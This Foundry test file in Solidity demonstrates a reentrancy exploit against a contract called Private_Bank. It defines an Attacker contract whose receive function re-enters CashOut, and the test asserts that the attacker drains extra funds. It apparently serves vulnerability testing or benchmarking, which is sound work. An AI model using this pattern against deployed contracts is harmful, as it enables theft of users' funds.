
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Private_Bank, Log} from "../src/Private_Bank.sol";

contract TestReentrancyPrivate_Bank is Test {

    Private_Bank public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        _contractUnderTest = new Private_Bank(address(log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 stateVal) public {
        
        vm.assume(stateVal > 1 ether);
        vm.assume(attackVal > 0);
        vm.assume(attackVal * 2 <= stateVal);
        vm.assume(stateVal <= type(uint128).max);
        

        uint256 fundAmount = stateVal + attackVal * 2;
        
        vm.deal(address(_contractUnderTest), fundAmount); 
        
        vm.deal(address(_attacker), fundAmount);

        vm.deal(address(this), fundAmount);
        
        
        _attacker.setupAttack{value: stateVal}(stateVal, attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Private_Bank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = Private_Bank(victimAddress);
    }

    function setupAttack(uint256 val, uint256 unused) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedVal = val;

        victim.CashOut(val);

        if (address(this).balance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.CashOut(storedVal);
        }
    }
}
